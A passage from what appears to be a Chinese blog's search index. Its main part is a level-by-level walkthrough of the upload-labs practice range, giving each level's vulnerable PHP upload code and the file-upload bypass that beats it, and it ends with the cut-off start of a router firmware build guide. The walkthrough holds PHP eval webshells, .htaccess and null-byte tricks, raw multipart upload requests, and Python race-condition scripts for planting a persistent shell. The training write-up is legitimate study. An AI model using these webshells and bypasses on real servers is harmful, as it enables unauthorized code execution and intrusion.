UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确,请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; } } Content-Type: application/x-php更改为Content-Type: image/jpeg ","date":"2021-01-25","objectID":"/upload-labs/:2:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-03 特殊可解析后缀 如果直接使用docker部署,这题没有配置特殊后缀解析 因此需要在/etc/apache2/apache2.conf中添加AddType application/x-httpd-php .php .phtml .phps .php3 .php5 .pht,然后重启容器 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 上传一个.phtml后缀的webshell ","date":"2021-01-25","objectID":"/upload-labs/:3:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-04 .htaccess $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 上传.htaccess \u003cFilesMatch \"a.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e 或者 AddType application/x-httpd-php .jpg 上传名为a.jpg的webshell ","date":"2021-01-25","objectID":"/upload-labs/:4:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-05 大小写绕过 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 少了$file_ext = strtolower($file_ext);这句用于转换为小写的代码,上传名为a.PHp的webshell ","date":"2021-01-25","objectID":"/upload-labs/:5:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-06 后缀名加空格 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 少了$file_ext = trim($file_ext);这句用于首尾去空的代码,因此利用windows系统的命名规则进行绕过,上传名为a.php 的webshell ","date":"2021-01-25","objectID":"/upload-labs/:6:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-07 后缀名加. $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 少了$file_name = deldot($file_name);这句用于删除文件名末尾的点的代码,因此利用windows系统的命名规则进行绕过,上传名为a.php.的webshell ","date":"2021-01-25","objectID":"/upload-labs/:7:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-08 后缀名加::$DATA $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 少了$file_ext = str_ireplace('::$DATA', '', $file_ext);这句用于删除::$DATA的代码,因此利用NTFS的特性进行绕过,上传名为a.php::$DATA的webshell,访问a.php进行getshell Windows下,如果文件名为a.php::$DATA时,::$DATA之后的数据当成文件流处理,不会检测后缀名,而保持::$DATA之前的文件名,即a.php ","date":"2021-01-25","objectID":"/upload-labs/:8:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-09 . .绕过 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 上传名为a.php. .的webshell,经过过滤后的文件名为a.php.,根据windows的文件名规则,最后的.被忽略,变成a.php ","date":"2021-01-25","objectID":"/upload-labs/:9:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-10 双写绕过 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } $file_name = str_ireplace($deny_ext,\"\", $file_name);,上传名为a.pphphp的webshell,访问a.php进行getshell ","date":"2021-01-25","objectID":"/upload-labs/:10:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-11 00截断 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; } } GET参数?save_path=../upload/a.php%00,上传名为a.jpg的webshell,访问a.php进行getshell ","date":"2021-01-25","objectID":"/upload-labs/:11:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-12 00截断 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传失败\"; } } else { $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; } } POST参数../upload/a.php%00,%00需要进行URLdecode,上传名为a.jpg的webshell,访问a.php进行getshell ","date":"2021-01-25","objectID":"/upload-labs/:12:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-13 文件头检查 function getReailFileType($filename){ $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } } } 为a.php添加png的文件头和文件尾,jpg与gif同理 ","date":"2021-01-25","objectID":"/upload-labs/:13:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-14 getimagesize绕过 function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)){ return $ext; }else{ return false; } }else{ return false; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } } } 使用Pass-13的方法或者直接在一张png图片后面添加webshell windows下制作图片马copy /b a.png + phpinfo.php b.png ","date":"2021-01-25","objectID":"/upload-labs/:14:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-15 exif_imagetype()绕过 function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } } } webshell同上 ","date":"2021-01-25","objectID":"/upload-labs/:15:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-16 二次渲染绕过 $is_upload = false; $msg = null; if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") \u0026\u0026 ($filetype==\"image/jpeg\")){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; $newimagepath = UPLOAD_PATH.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"png\") \u0026\u0026 ($filetype==\"image/png\")){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; $newimagepath = UPLOAD_PATH.$newfilename; imagepng($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"gif\") \u0026\u0026 ($filetype==\"image/gif\")){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; $newimagepath = UPLOAD_PATH.$newfilename; imagegif($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else{ $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; } } imagecreatefromxxx($target_path)对图片进行了二次渲染,目标是图片在进行二次渲染后,仍然能够保留webshell upload-labs之pass 16详细分析 ","date":"2021-01-25","objectID":"/upload-labs/:16:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"GIF GIF来源于GIF-wikipedia 1.gif为原图片,2.gif为二次渲染之后的图片,可以看到webshell仍然可用 ","date":"2021-01-25","objectID":"/upload-labs/:16:1","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"PNG 将webshell置于PLTE块中,然后重新计算CRC(010Editor可以自动计算) source.png为原图片,1.png为插入webshell后重新计算CRC的图片,2.png为二次渲染之后的图片 ","date":"2021-01-25","objectID":"/upload-labs/:16:2","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"JPG jpg_payload ","date":"2021-01-25","objectID":"/upload-labs/:16:3","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-17 条件竞争 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1);//获取实际拓展名 $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); } }else{ $msg = '上传出错！'; } } 先将文件上传到服务器,再对文件类型进行判断,然后进行删除,因此在unlink前保证webshell可以访问即可,即不断发送上传webshell的数据包 # -*- coding: UTF-8 -*- import requests import multiprocessing def upload(list): url = \"http://192.168.1.12/Pass-17/index.php\" target_url = \"http://192.168.1.12/upload/getshell.php\" file = {'upload_file': ( 'getshell.php', \"\u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[a]);?\u003e');?\u003e\", 'image/jpeg')} data = {'submit': '上传'} upload_post = requests.post(url=url, data=data, files=file) upload_check = requests.get(url=target_url) if upload_check.status_code == 200: print(\"getshell!!!\") Threadpool = multiprocessing.Pool(200) Threadpool.map(upload, range(10000)) Threadpool.close() Threadpool.join() 通过在删除文件前访问getshell.php,从而在upload目录下生成一个持久的shell ","date":"2021-01-25","objectID":"/upload-labs/:17:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-18 条件竞争 查看源代码可知,先进行了文件的移动$ret = $this-\u003emove();再进行文件的重命名$ret = $this-\u003erenameFile();,因此在文件进行重命名之前利用Apache的解析漏洞来访问即可getshell import requests import multiprocessing def upload(list): url = \"http://192.168.1.123/Pass-18/index.php\" target_url = \"http://192.168.1.123/uploadgetshell.php.7z\" file = {'upload_file': ( 'getshell.php.7z', \"\u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[a]);?\u003e');?\u003e\", 'image/jpeg')} data = {'submit': '上传'} upload_post = requests.post(url=url, data=data, files=file) upload_check = requests.get(url=target_url) if upload_check.status_code == 200: print(\"getshell!!!\") Threadpool = multiprocessing.Pool(100) Threadpool.map(upload, range(10000)) Threadpool.close() Threadpool.join() ","date":"2021-01-25","objectID":"/upload-labs/:18:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-19 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } move_uploaded_file会清除掉文件名末尾的/.因此可以利用文件名a.php/.来绕过第一次的文件拓展名检查,然后利用清除,达到上传a.php的目的 POST /Pass-19/index.php HTTP/1.1 Host: 0.0.0.0 Content-Length: 414 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://0.0.0.0 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBsjaxewFhZnXRVQL User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://0.0.0.0/Pass-19/index.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryBsjaxewFhZnXRVQL Content-Disposition: form-data; name=\"upload_file\"; filename=\"a.png\" Content-Type: image/png \u003c?php @eval($_POST['a']);?\u003e ------WebKitFormBoundaryBsjaxewFhZnXRVQL Content-Disposition: form-data; name=\"save_name\" a.php/. ------WebKitFormBoundaryBsjaxewFhZnXRVQL Content-Disposition: form-data; name=\"submit\" 上传 ------WebKitFormBoundaryBsjaxewFhZnXRVQL-- 或者利用CVE-2015-2348move_uploaded_file()00截断 move_uploaded_file()中的img_path是由save_name控制的,因此可以在save_name利用00截断绕过a.php%00.jpg,得到a.php ","date":"2021-01-25","objectID":"/upload-labs/:19:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-20 $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \"禁止上传该类型文件!\"; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"禁止上传该后缀文件!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"文件上传成功！\"; $is_upload = true; } else { $msg = \"文件上传失败！\"; } } } }else{ $msg = \"请选择要上传的文件！\"; } 上传一个save_name数组,第一个参数为a.php/,第二个参数为空,第三个参数为jpg,因此满足了拓展名检查的需要而reset($file)得到a.php/ $file[count($file)-1]等价与$file[1],因为count不对空参数进行统计,而$file[1]为空,因此传递到move_upload_file的参数为a.php/.,然后的步骤跟上题一致 POST /Pass-20/index.php?action=show_code HTTP/1.1 Host: 192.168.8.9 Content-Length: 518 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.8.9 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrbf06RIpGRTVM5LU User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.8.9/Pass-20/index.php?action=show_code Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryrbf06RIpGRTVM5LU Content-Disposition: form-data; name=\"upload_file\"; filename=\"a.png\" Content-Type: image/png \u003c?php @eval($_POST['a']);?\u003e ------WebKitFormBoundaryrbf06RIpGRTVM5LU Content-Disposition: form-data; name=\"save_name[0]\" a.php/ ------WebKitFormBoundaryrbf06RIpGRTVM5LU Content-Disposition: form-data; name=\"save_name[2]\" jpg ------WebKitFormBoundaryrbf06RIpGRTVM5LU Content-Disposition: form-data; name=\"submit\" 上传 ------WebKitFormBoundaryrbf06RIpGRTVM5LU-- ","date":"2021-01-25","objectID":"/upload-labs/:20:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["HappyLife"],"content":"在JNU使用Lede+mentohust进行有线网络共享,路由器型号为Newifi3 d2,此方案自19年12月开始使用 初始化环境 在虚拟机中安装Ubuntu 20.04 LTS x64并换源\u0026添加宿主机代理 sudo apt-get update sudo apt-get -y install build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3 python2.7 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf wget curl swig rsync clone代码 Lede源代码 git clone https://github.com/coolsnowwolf/lede 更新feeds feeds即软件包列表 cd lede ./scripts/feeds update -a #网络原因可能需要多次执行,建议使用全局代理 ./scripts/feeds install -a 添加第三方软件包(mentohust) MentoHUST-OpenWrt-ipk 在lede目录下 git clone 